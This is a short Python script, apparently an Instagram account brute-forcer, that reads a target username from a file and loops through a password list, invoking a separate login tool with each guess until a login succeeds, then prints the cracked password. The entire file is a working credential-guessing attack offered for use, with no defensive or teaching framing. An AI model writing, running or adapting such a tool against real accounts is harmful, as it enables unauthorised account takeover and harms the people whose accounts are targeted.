import os
import subprocess
import time
#beji_attack
pn = 0
#jinanpro
filen = open('userlist.txt','r')
x = filen.readline().strip()
z = "pw.txt"

y = 1000000000000

print(f'\nTrying...\n')

def instabrute(usr,pf,pnum): 
   fw=open(str(pf),'r')
   USERNAME=str(usr)
   for i in range(int(pnum)):   
      PASSWORDS = fw.readline().strip()
      if PASSWORDS == "":
           print(f"Password not in list :( ")
           quit()
      print(f"{PASSWORDS}\n")
      f = str(subprocess.run(["python","main.py","-u",USERNAME,"-p",PASSWORDS,"-o","info"], capture_output=True))
      #print(f)
      if "Login not successful" in f:
      #     print("fail")
           ldirjikasjk = "bll"
      else:
          print(f"Password for {USERNAME} is :  {PASSWORDS} :)")
          break

def instabrutelx(usr,pf,pnum): 
   fw=open(str(pf),'r')
   USERNAME=str(usr)
   for i in range(int(pnum)):   
      PASSWORDS = fw.readline().strip()
      if PASSWORDS == "":
           print(f"Password not in list :( ")
           quit()
      print(f"{PASSWORDS}\n")
      f = str(subprocess.run(["python","main.py","-u",USERNAME,"-p",PASSWORDS,"-o","info"], capture_output=True))
      #print(f)
      if "Login not successful" in f:
      #     print("fail")
           ldirjikasjk = "bll"
      else:
          print(f"Password for {USERNAME} is :  {PASSWORDS} :)")
          break

if os.name == "nt":      
     instabrute(x,str(z),y)
if os.name == "posix":
     instabrutelx(x,str(z),y)
input()
if os.name == "nt":
     os.system("cls")
if os.name == "posix":
     os.system("clear")
quit()